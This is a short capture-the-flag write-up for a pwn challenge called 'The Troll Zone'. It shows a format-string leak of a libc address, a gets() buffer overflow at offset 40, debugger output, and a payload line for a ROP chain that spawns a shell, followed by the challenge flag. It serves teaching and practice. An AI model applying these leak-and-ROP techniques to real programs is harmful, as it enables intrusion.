# The Troll Zone

Domain: pwn

Points: 452

Solves: 53

### Given information

> ROP ROP all the way

### Solution

Writeup author: arikazo

In the troll function there is format string vulnerability

```c 
printf(local_28);
```

Use it to get `__libc_start_main + 133` address \
Format string sent: `%37$p`
```
0x7ffff7e09305 <__libc_start_main+133>:
```
There is bof in main function

```c 
gets(local_28);
```

So find the offset to return address 
```
pwndbg> i f
Stack level 0, frame at 0x7fffffffd770:
 rip = 0x401281 in main; saved rip = 0x7ffff7e0924a
 Saved registers:
  rbp at 0x7fffffffd760, rip at 0x7fffffffd768
pwndbg> x/32gx $rsp
0x7fffffffd740: 0x0000004141414141      0x00007ffff7fe6ea0
0x7fffffffd750: 0x0000000000000000      0x00007ffff7ffdad0
0x7fffffffd760: 0x0000000000000001      0x00007ffff7e0924a
```
The offset is `40`

Now create a rop chain to call `system(/bin/sh)` and get shell

Fill the buffer till RIP with random characters \
Set rip to rop chain

`payload = b'A'* 40 + rop.chain()`

[solve.py](solve.py)

**Flag:** `KashiCTF{did_some_trolling_right_there_fKXGtMLN}`
